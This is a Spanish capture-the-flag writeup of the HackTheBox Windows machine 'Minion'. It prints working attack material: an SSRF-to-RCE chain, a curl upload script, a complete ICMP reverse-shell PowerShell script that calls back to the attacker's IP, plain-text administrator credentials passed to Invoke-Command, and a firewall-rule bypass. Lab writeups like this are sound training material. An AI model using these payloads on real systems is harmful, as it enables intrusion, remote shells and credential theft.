---
layout      : post
title       : "Maquina Minion - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Minion/minion.PNG
category    : [ hackthebox ]
tags        : [ Server Site Request Forgery - SSRF, ICMP Reverse Shell, Firewall Bypassing, Weak Permissions, Information Disclosure, Alternative Data Streams - ADS, Firewall Rule Manipulation ]
---

El dia de hoy vamos a resolver `Minion` de `hackthebox` una maquina `windows` de dificultad insane, esta vez vamos contra una maquina potente donde a traves de un servicio `http` vamos a aprovecharnos de un `SSRF` para descubrir un puerto interno local que a traves de un parametro nos permitira realizar `RCE`, pero al existir reglas de `firewall` implementadas por `TCP` y por `UDP` ganaremos acceso por `ICMP`, despues abusaremos de los permisos de un script en `powershell` para mediante una tarea programada obtener unas contraseñas privilegiadas y finalmente manipularemos las reglas de `firewall` para habilitarnos el acceso a los puertos internos de la maquina y poder ejecutar un `exe` que nos permitira visualizar la root.txt como el usuario `Administrator`. 
    
 Maquina muy guapa asi que vamos a darle!.

Comenzamos como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Minion
❯ ls

 Minion
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 
Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.57
PING 10.10.10.57 (10.10.10.57) 56(84) bytes of data.
64 bytes from 10.10.10.57: icmp_seq=1 ttl=127 time=194 ms

--- 10.10.10.57 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 193.546/193.546/193.546/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127` y por proximidad seria correspondiente a una maquina `windows`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:12 -05
Initiating SYN Stealth Scan at 17:12
Scanning 10.10.10.57 [65535 ports]
Discovered open port 62696/tcp on 10.10.10.57
Completed SYN Stealth Scan at 17:13, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.57
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-15 17:12:41 -05 for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
62696/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 15 (660B)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p62696 10.10.10.57 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 17:14 -05
Nmap scan report for 10.10.10.57
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/backend
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
```

Entre los puertos abiertos mas relevantes podemos visualizar:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 62696     | HTTP     |  Microsoft IIS httpd 8.5|


## EXPLOTACION [#](#explotacion) {#explotacion}

Como vemos que el puerto `62696` corresponde a un servicio web con `whatweb` vamos a tratar de enumear las tecnolologias que utiliza y tal como nos muestra `nmap` nos enfrentamosa un IIS.

```bash
❯ whatweb http://10.10.10.57:62696
http://10.10.10.57:62696 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.57], Microsoft-IIS[8.5], X-Powered-By[ASP.NET]
```

Procedemos a abrir el servicio en nuestro navegador y visualizamos una pagina referente a minions.

![](/assets/images/HTB/htb-writeup-Minion/mini1.PNG)

Como nos enfrentamos a un `IIS`, con `wfuzz` podemos tratar de fuzzear archivos con extensiones `asp y aspx`.

```bash
❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,asp-aspx -u http://10.10.10.57:62696/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.57:62696/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000001221:   200        0 L      7 W        41 Ch       "test - asp"       
```

visualizamos la ruta `test.asp` y observamos que nos solicita el parametro `u` para realizar la solicitud.


![](/assets/images/HTB/htb-writeup-Minion/mini2.PNG)


Haciendo uso del parametro, podemos tratar de enviarnos una petición hacia nuestro equipo pero vemos falla.


![](/assets/images/HTB/htb-writeup-Minion/mini3.PNG)


Recordemos pero que tambien podemos realizar peticiones apuntando hacia la propia maquina y en efecto vemos contenido en el puerto `80` en local.

![](/assets/images/HTB/htb-writeup-Minion/mini4.PNG)


Entre las opciones que tenemos podemos ver `system commands` y si hacemos hovering nos muestra la ruta `cmd.aspx`, asi que podemos tratar de llegar a esta con la petición interna.

![](/assets/images/HTB/htb-writeup-Minion/mini5.PNG)

Si tratamos de ejecutar un comando nos muestra un error, pero si inspeccionamos el codigo fuente vemos que necesitamos incorporar el parametro `xcmd`.

![](/assets/images/HTB/htb-writeup-Minion/mini6.PNG)

Probamos nuevamente a ejecutar un comando, esta vez mandando una traza a nuestra maquina host, obtenemos un `exit status = 0` y recibimos la petición correctamente.

![](/assets/images/HTB/htb-writeup-Minion/mini7.PNG)

```bash
❯ tcpdump -i tun0 icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:40:07.142661 IP (tos 0x0, ttl 127, id 6473, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.10.57 > 10.10.16.10: ICMP echo request, id 1, seq 1, length 40
17:40:07.142685 IP (tos 0x0, ttl 64, id 60344, offset 0, flags [none], proto ICMP (1), length 60)
    10.10.16.10 > 10.10.10.57: ICMP echo reply, id 1, seq 1, length 40
```

Si ahora que tenemos `RCE` podemos tratar de enviarnos una `reverse shell` a nuestra maquina, pero no va a ser posible puesto que por dentro existen reglas de firewall que evitan que ganemos acceso por `tcp` y por `udp`.

Pero podriamos entablarnos una `reverse shell` por `ICMP` ya que tenemos traza con nuestra maquina, para ello vamos a usar el script `Invoke-PowerShellIcmp.ps1` del repositorio de `nishang`:

* [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)


Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script `icmpsh_m.py` que necesitamos descargar.

![](/assets/images/HTB/htb-writeup-Minion/mini8.PNG)


Nos descargamos el archivo y ejecutamos los comandos.

* [https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py](https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py)


Ahora para evitar problemas en el script `Invoke-PowerShellIcmp.ps1` vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final `Invoke-PowerShellIcmp -IPAddress 10.10.16.10`, para que al interpretarse ejecute la instrucción.

```powershell
cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' > icmp.ps1
❯ cat icmp.ps1
function Invoke-PowerShellIcmp
{ 
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128
    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress 10.10.16.10
```


Lo que tenemos que hacer ahora es meter este script en la maquina victima, pero debemos hacerlo en un formato en la que `powershell` lo entienda por ello usaremos `iconv` para separ cada caracter y despues convertirlo en base64.

```bash
cat icmp.ps1 | iconv -t utf-16le | base64 -w 0 > icmp.ps1.b64
```

Ahora vamos a crear un script en `bash` que nos ayude a automatizar la inserción de nuestro script en la maquina victima, vamos a utilizar `curl` pero como tiene un numero limite de caracteres por linea que podemos enviar, a nuestro script `icmp.ps1.b64` vamos a aplicarle el comando `fold` para que tenga un numero de caracteres igual por cada linea y asi evitar problemas.

```bash
❯ /bin/cat automatize.sh
#!/bin/bash

function ctrl_c(){
    echo -e "\[!] Saliendo..."
    tput cnorm; exit 1
}

#CTRL_C
trap ctrl_c INT

declare -r main_url="http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx"

counter=0

echo; tput civis; for line in $(cat icmp.ps1.b64); do 
    command="echo $line >> C:\Temp\script.ps1"

    echo -ne "[+] Total de lineas enviadas [$counter/87]\r"

    curl -s -X GET -G $main_url --data-urlencode "xcmd=$command" &>/dev/null

    let counter+=1

done; tput cnorm
```

Al ejecutar el script lo que hara sera crear el archivo `script.ps1` en la ruta `C:\Temp\` con el contenido del `icmp.ps1.b64`, esto podemos verificarlo si desde el navegador le hacemos un `type` para leerlo y nos muestra con exist status 0.


![](/assets/images/HTB/htb-writeup-Minion/mini9.PNG)


Para poder ejcutarlo primero debemos transformar la data a un codigo legible por `powershell` ya que esta se encuentra en base64, para ello usaremos los siguientes comandos ejecutados desde una powershell.

```powershell
❯ pwsh
PowerShell 7.2.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

Welcome to Parrot OS 

┌[parrot@root]-[10:48-16/10]-[/home/fmiracle/machines/Minion/content]
└╼$ $fileContent = Get-Content ./icmp.ps1.b64
┌[parrot@root]-[10:51-16/10]-[/home/fmiracle/machines/Minion/content]
└╼$ $fileDecode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($fileContent))
```

De esta manera similar tendriamos que introducirlo en la maquina, pero aputando al archivo `script.ps1` en la maquina victima.

![](/assets/images/HTB/htb-writeup-Minion/mini10.PNG)

Si leemos el nuevo archivo, vemos que lo creamos de manera existosa.

![](/assets/images/HTB/htb-writeup-Minion/mini11.PNG)


Ahora no olvidemos ejcutar los comandos que requeria el script, usare `rlwrap` para tener un mejor manejo de la consola.

```bash
❯ sysctl -w net.ipv4.icmp_echo_ignore_all=1
❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
```

Ahora que estamos en escucha solo debemos ejecutar el script y recibimos la conexión.

![](/assets/images/HTB/htb-writeup-Minion/mini12.PNG)

```cmd
❯ rlwrap python icmpsh_m.py 10.10.16.10 10.10.10.57
Windows PowerShell running as user MINION$ on MINION
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
```

Ahora al tratar de listar el directorio personal del usuario decoder.MINION, no tenemos acceso:


![](/assets/images/HTB/htb-writeup-Minion/mi1.PNG)


Pero si listamos la raiz, vemos un directorio `sysadmscripts`.

![](/assets/images/HTB/htb-writeup-Minion/mi2.PNG)


Dentro vemos dos archivos uno `.bat` y un script en powershell.

![](/assets/images/HTB/htb-writeup-Minion/mi3.PNG)

![](/assets/images/HTB/htb-writeup-Minion/mi4.PNG)


Vemos que el `del_logs.bat` ejecuta el `c.ps1` y como es de borrado de logs, quiero pensar que hay una tarea programada que lo ejecuta a intervalos regulares de tiempo.

Si vemos los permisos del script `c.ps1` todos tienen privilegios full sobre este, entonces podemos tratar de manipularlo y traernos los archivos del directorio del usuario `decoder.MINION` asumiendo que este usuario es el que realiza la ejecución de la tarea o otro con mas privilegios.

![](/assets/images/HTB/htb-writeup-Minion/mi5.PNG)

Listamos el directorio despues de unos minutos y vemos un backup.zip y la flag `user.txt` que procederemos a leer.

![](/assets/images/HTB/htb-writeup-Minion/mi6.PNG)



## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Vemos que ademas de la flag, obtuvimos un archivo comprimido `backup.zip`, que si bien podemos descomprimirlo no vamos a encontrar información relevante, por ello debemos pensar fuera de la caja y preguntarnos que formas existen en windows para ocultar información o metadatos.

Por ello debemos tener en cuenta el concepto de los `Alternative Data Streams - ADS`.

> ADS: Los Flujos Alternativos de Datos, Alternate Data Streams o ADS son una característica del sistema de archivos NTFS que permite almacenar metainformación con un fichero, sin necesidad de usar un fichero separado para almacenarla.

Para poder ver si hay configurados `ADS` en una ruta, debemos ejecutar el siguiente comando:

![](/assets/images/HTB/htb-writeup-Minion/mi7.PNG)

Vemos que el archivo `backup.zip` tiene una `ADS` pass, asi que leemos el contenido y encontramos un hash en `md5`.

```cmd
type C:\Temp\backup.zip:pass
28a5d1e0c15af9f8fce7db65d75bbf17
```

Lo crackeamos usando nuestra pagina de confianza y obtenemos una contraseña.

* [https://crackstation.net/](https://crackstation.net/)


![](/assets/images/HTB/htb-writeup-Minion/mini13.PNG)

Si bien contamos con credenciales, no podemos conectarnos con `evil-winrm` o con `psexec` debido a que solo vemos abierto el puerto `62696`, pero podemos hacer uso de `PSCredential` y ejecutar un comando a traves de `ScriptBlock`.


```cmd
hostname
minion

        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 
minion\administrator
```

Ahora podriamos tratar de ejecutar leer la segunda flag, vemos que antes tenemos que ejecutar el `root.exe`, pero curiosamente no podemos hacerlo desde aqui.

```cmd
        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
In order to get the flag you have to launch root.exe located in this folder!

        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { C:\Users\Administrator\Desktop\root.exe }
Are you trying to cheat me?
```

Ahora recordemos que tenemos privilegios como administradores, asi que podemos tratar de modificar las reglas de `firewall`, de modo que tengamos acceso a los puertos que estan abiertos internamente en la maquina.


```cmd
        $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { New-NetFirewallRule -DisplayName fmiracle -RemoteAddress 10.10.16.10 -Direction inbound -Action allow }

Name                    : {fe96175f-38d1-451f-ad74-95e144f0d702}
ID                      : {fe96175f-38d1-451f-ad74-95e144f0d702}
Group                   : 
Platform                : {}
LSM                     : False
Profile                 : Any
PSComputerName          : localhost
RunspaceId              : 3cd818dd-a33a-4cf9-85a5-069c0144cf18
Caption                 : 
Description             : 
ElementName             : fmiracle
InstanceID              : {fe96175f-38d1-451f-ad74-95e144f0d702}
```

Si ahora tratamos de ver los puertos abiertos de la maquina.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 12:50 -05
Initiating SYN Stealth Scan at 12:50
Scanning 10.10.10.57 [65535 ports]
Discovered open port 445/tcp on 10.10.10.57
Discovered open port 135/tcp on 10.10.10.57
Discovered open port 139/tcp on 10.10.10.57
Discovered open port 80/tcp on 10.10.10.57
Discovered open port 3389/tcp on 10.10.10.57
Discovered open port 49153/tcp on 10.10.10.57
Discovered open port 49154/tcp on 10.10.10.57
Discovered open port 49157/tcp on 10.10.10.57
Discovered open port 62696/tcp on 10.10.10.57
Discovered open port 49152/tcp on 10.10.10.57
Discovered open port 49156/tcp on 10.10.10.57
Discovered open port 49155/tcp on 10.10.10.57
Discovered open port 5985/tcp on 10.10.10.57
Discovered open port 47001/tcp on 10.10.10.57
Completed SYN Stealth Scan at 12:51, 27.30s elapsed (65535 total ports)
Nmap scan report for 10.10.10.57
Host is up, received user-set (0.21s latency).
Scanned at 2023-10-16 12:50:43 -05 for 28s
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49155/tcp open  unknown       syn-ack ttl 127
49156/tcp open  unknown       syn-ack ttl 127
49157/tcp open  unknown       syn-ack ttl 127
62696/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
           Raw packets sent: 131072 (5.767MB) | Rcvd: 40 (1.600KB)
```

Podriamos tratar de conectarnos por a traves del puerto 3389 por `RDP`, ejecutar el `root.txt` y visualizar la segunda flag `root.txt`.


![](/assets/images/HTB/htb-writeup-Minion/mini14.PNG)


